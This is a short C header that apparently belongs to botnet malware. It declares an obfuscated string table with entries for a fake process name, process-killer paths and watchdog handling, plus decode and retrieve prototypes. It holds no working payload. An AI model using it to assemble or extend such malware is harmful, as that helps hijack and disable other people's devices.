#pragma once

#include <stdint.h>

#include "util.h"

struct enc_value {
    char *encoded;
};

#define ENC_MAIN_TXT					0
#define ENC_FAKENAME					1
#define ENC_EXEC_MSG					2
#define ENC_KILLER_PROC                 3
#define ENC_KILLER_PROCNET              4
#define ENC_KILLER_PROCFS               5
#define ENC_WATCHDOG_ONE                6
#define ENC_WATCHDOG_TWO                7

#define ENC_MAX_KEYS  					8

void enc_init(void);
void enc_decode(char *, char *);
void enc_retrive(int, char *);
static void add_entry(uint8_t, char *, int);
